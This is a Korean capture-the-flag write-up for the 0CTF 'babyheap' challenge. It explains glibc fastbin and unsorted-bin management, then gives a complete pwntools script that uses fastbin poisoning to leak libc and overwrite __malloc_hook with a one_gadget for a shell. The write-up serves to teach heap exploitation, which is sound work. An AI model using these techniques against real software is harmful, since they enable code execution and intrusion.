0CTF Babyheap write-up
======================



##Background 
###heap chunk management (fastbin,unsorted bin) + etc

* 읽기전에 <http://umbum.tistory.com/386> 여기 들러서 free chunk 구조를 보고오세요~

Heap 영역을 allocate할 때 할당된 크기에 따라서 free하였을 때 관리되는 방법과 영역이 다릅니다.

####fastbin
#####[64bit 기준]
0x20~0x80의 chunksize를 가지는 경우 fastbin에서 관리를 하게 됩니다. 
간단한 예시 코드로 설명해드리겠습니다.

~~~
	A = malloc(0x20);
	B = malloc(0x20);
	C = malloc(0x20);
	
	> break 1
	
	free(A);
	free(B);
	free(C);
	
	> break 2
	
	D = malloc(0x20);
	E = malloc(0x20);
	F = malloc(0x20);
~~~

break 1 구간까지 진행된 상황의 힙 구조입니다.
>gdb peda$ parseheap

	addr		prev	size	status	fd		 bk                
	0x602000	0x0 	0x30	Used	None	 None [A]
	0x602030 	0x0		0x30	Used	None	 None [B]
	0x602060	0x0		0x30	Used	None	 None [C]
break 2 구간까지 실행이 된다면 구조는 이렇게 변합니다.

	addr		prev	size	status	fd		 bk                
	0x602000	0x0 	0x30	Freed	0x0		 None [A]
	0x602030 	0x0		0x30	Freed	0x602000 None [B]
	0x602060	0x0		0x30	Freed	0x602030 None [C]
free(A)가 되면 `0x602000청크`가 `free`가 되고 `fastbin`이라는 리스트에 저장이 됩니다.  
그리고 그 다음 free(B)가 되면 `0x602030청크`가 `free`되고 `fastbin`이라는 리스트에 저장이 되는데,  
이미 A청크의 주소가 리스트에 존재하기 때문에 `A의 주소`를 `0x602030청크`의 **fd**에 저장을 해둡니다.  
마찬가지로 C를 `free`할때도 `fastbin`리스트에 저장이 되는데 이미 `B의 주소`가 존재하기 때문에 `B의 주소`를 `C의 fd`에 저장을 하게됩니다.  
그 결과가 위의 구조입니다. `B청크`의 `fd`에는 `A의 주소`, `C청크`의 `fd`에는 `B의 주소`가 들어가 있습니다.

fastbin의 현재 상태를 보게 된다면, 이렇습니다.
>gdb peda$ heapinfo

	(0x20)     fastbin[0]: 0x0
	(0x30)     fastbin[1]: 0x602060[C]-->0x602030[B]-->0x602000[A]--> 0x0
	(0x40)     fastbin[2]: 0x0
	(0x50)     fastbin[3]: 0x0
	(0x60)     fastbin[4]: 0x0
	(0x70)     fastbin[5]: 0x0
	(0x80)     fastbin[6]: 0x0
할당한 크기가 `0x20`이기 때문에 prev in use, size까지 합쳐진 전체 청크의 사이즈는 0x30이라 0x30사이즈를 관리하는 fastbin[1]에 들어가있습니다.  
아까 설명한 대로 `C->B->A`의 구조로 연결되어 있습니다.     
  
이 상태에서 `0x20`을 한번 더 할당해줍니다. `malloc을` 하게되면 `fastbin`에 해당 사이즈에 맞는 청크가 있는지 확인하게 되는데, 현재 할당하려는 크기의 청크( `청크 size`는 `0x30`, `할당받고자 하는 size`는 `0x20` 헷갈리지 맙시다~ )가 `fastbin`에 있기 때문에 현재 list에 있는 `[C]의 주소`를 할당하게 됩니다.  
**B와 A의 주소는 각 청크의 fd로 빠진 상태임**  
**( stack과 유사한 구조 마지막에 들어온 청크가 먼저 할당됨 )**
	
	(0x20)     fastbin[0]: 0x0
	(0x30)     fastbin[1]: 0x602030[B]-->0x602000[A]--> 0x0
	(0x40)     fastbin[2]: 0x0

C의 주소가 할당되면서 다시 `B의 주소`가 `fastbin`에 들어가게 되고 

	addr		prev	size	status	fd		 bk                
	0x602000	0x0 	0x30	Freed	0x0	     None [A]
	0x602030 	0x0		0x30	Freed	0x602000 None [B]
	0x602060	0x0		0x30	Used	None	 None [C] 이제는 [D]
	
이렇게 `C의 주소`가 할당받아집니다.

간단하게 `fastbin`의 작동원리에 대해서 알아보았습니다. `fastbin`은 이름 그대로 `fast`함을 추구하기 때문에 다른 bin들보다는 `checking`이 덜한 편입니다.  
  
####이 문제는 `fastbin`에 들어간 청크들의 `fd`를 조작하여 원하는 곳에 청크를 할당받을 수 있다는 점을 이용하여 풀이하게 됩니다.

####unsorted bin
free된 청크가 top청크가 아닐경우 small / large bin으로 들어가는 것이 아닌 `unsorted bin`이라는 곳에 들어가 재할당을 기다립니다. 이때 이bin을 관리하는 곳이 `main arena`라는 곳입니다.  
  
쉽게 말하자면 fastbin size가 아닌 청크들(0x80보다 큰)이 `free`되면 `fd`,`bk`에 `main_arena`의 주소가 담기게 됩니다.  따라서 이 부분을 `leak`하게 된다면 `libc base`주소를 알 수 있습니다.
  
#### malloc_hook

libc안에 존재하는 영역입니다. `malloc()`을 호출할 때 `malloc_hook`에 값이 있으면 그것을 호출하게 해줍니다. 

따라서 `malloc_hook`을 원하는 함수의 주소로 덮는다면 `malloc`이 될때 그 함수가 실행되게 되는 것 입니다.

#### oneshot gadget

libc내부에 쉘을 실행시키는 `gadget`이 있는데 `execve("/bin/sh"...)`이 실행되게 됩니다.

한마디로 프로그램의 흐름을 저 `gadget`으로 돌리기만 한다면 쉘이 따진다는 소리..  

>_정말 마술같은 일이다.. 그래서 `magic gadget`이라고도 부른다._

하지만 이 `gadget`은 매우 민감하다 충족해야할 조건이 몇가지가 있다. 따라서 사용을 못하는 경우도 있다는 사실을 잊지 맙시다. 

구하는 방법은 아래의 주소를 참고.  
<https://www.lazenca.net/pages/viewpage.action?pageId=16810292>

##Exploit scenario

원래 바이너리 분석을 하겠지만, 이 문제는 정말 쉽다. 분석은 스스로 해보도록 합시다..  
간단하게만 말하자면, `allocate`, `fill`, `free`, `dump` 이렇게 4가지의 메뉴가 있는데 각자 그 메뉴의 충실한 역할을 수행합니다.  

다만 `fill`에서 데이터를 적는 크기를 제한을 두지 않아서 원하는 만큼 쓸 수가 있습니다. 쉽게 말하자면 `gets(buf)`의 상황과 비슷하다..  

따라서	  

	A[0x20]  
	B[0x20]  
	C[0x20]  
	D[0x20]  
	E[0x100]  

이런식으로 할당을 해준다음 `C,B`를 `free`하여 `B->C`를 만들어줍니다.   
그 다음 `A`에 `fill`을 이용하여 `C`의 `fd`를 한 바이트만 `0xc0`으로 덮어 `B->C->E`로 만들어줍니다.
(heap영역이 0x...00에 할당받기 때문에 E청크의 주소는 0x...c0입니다.)

`fastbin`에서 받아서 할당할때 해당 청크의 `size`를 검사하게 되는데, 현재 E의 청크사이즈는 `0x110`이기 때문에 이대로 할당을 받으면 프로그램이 죽어버립니다.

이를 해결하기위해 D에 fill을 이용하여 `E의 size`를 `0x31`로 만들어 줍니다. (실제 size는 0x30 flag값 때문에 0x31)  
이제 `allocate(0x20)`을 세번을 하게되면 `B, C, E` 순서대로 할당이 받아지게 됩니다.  
따라서 E청크가 중복으로 할당이 된 것입니다. 이를 이용하여 하나는 `free`를 해주어 contents를 main arena의 주소로 만들어주고 free하지 않은 나머지 하나로 `dump`를 하게되면 libc를 릭할 수 있습니다.  

똑같은 방법으로 `fd`를 `malloc_hook`으로 덮습니다. 여기서 문제는 아까와 같이 `size check`입니다. 청크의 size부분이 0 이거나 0x80이상이면 안됩니다.  

`malloc_ hook`은 libc내부에 있기때문에 근처에 0x7f....의 주소가 많이 있습니다. 이 `0x7f`를 이용하여 `size` 부분을 0x7f로 만드는 공간을 찾습니다.  
해당 공간에 할당을 받은 뒤 `malloc_ hook`을 `one_ gadget`으로 덮습니다.

그렇게 되면 `malloc()`이 호출되면 쉘이 따지게 됩니다!!

##Exploit code
#####삽질이 많습니다...

	from pwn import*
	
	s = process('./babyheap')
	one = 0x4526a
	
	def alloc(size):
	        print ("alloc size [%d]" %size)
	        s.recvuntil('Command: ')
	        s.sendline('1')
	        s.recvuntil('Size: ')
	        s.sendline(str(size))
	def fill(index,size,content):
	        print ("fill at [%d]" %index)
	        s.recvuntil('Command: ')
	        s.sendline('2')
	        s.recvuntil('Index: ')
	        s.sendline(str(index))
	        s.recvuntil('Size: ')
	        s.sendline(str(size))
	        s.recvuntil('Content: ')
	        s.send(content)
	def free(index):
	        print ("free [%d]" %index)
	        s.recvuntil('Command: ')
	        s.sendline('3')
	        s.recvuntil('Index: ')
	        s.sendline(str(index))
	def dump(index):
	        print ("dump [%d]" %index)
	        s.recvuntil('Command: ')
	        s.sendline('4')
	        s.recvuntil('Index: ')
	        s.sendline(str(index))
	        s.recvuntil('Content: ')
	for i in range(4):
	        alloc(0x20)
	
	alloc(0x100) # 4
	alloc(0x20) # 5
	
	free(1)
	free(2)
	
	fill(0,0x61,'\x00'*0x28+ p64(0x31) + '\x00'*0x28 + p64(0x31) + '\xc0')
	fill(3,0x2a,'\x00'*0x28+'\x31\x00')
	
	alloc(0x20) # 1
	alloc(0x20) # 2
	
	fill(3,0x2a,'\x00'*0x28+'\x11\x01')
	free(4)
	
	dump(2)
	
	s.recv(8)
	leak = hex(u64(s.recv(8)))[:-2]
	libc_base = int(leak,16)-0x3c3b78-0x1000#104
	malloc_hook = hex(int(leak,16)-104)#104
	oneshot = hex(libc_base + one)
	malloc_hook_near = int(malloc_hook,16)-0x10-19
	log.info("malloc hook %s " %malloc_hook)
	log.info("oneshot %s " %oneshot)
	print "near :",hex(malloc_hook_near)
	
	alloc(0x100) # 4
	
	
	for i in range(3):
	        alloc(0x60)
	free(6)
	free(7)
	
	fill(5,0xa8,'\x00'*0x28+ p64(0x71) + '\x00'*0x68 + p64(0x71) + p64(malloc_hook_near))
	
	alloc(0x60) # 6
	alloc(0x60) # 7
	
	fill(7,27,'\x00'*(19)+p64(int(oneshot,16)))
	
	alloc(0x20)
	
	s.interactive()
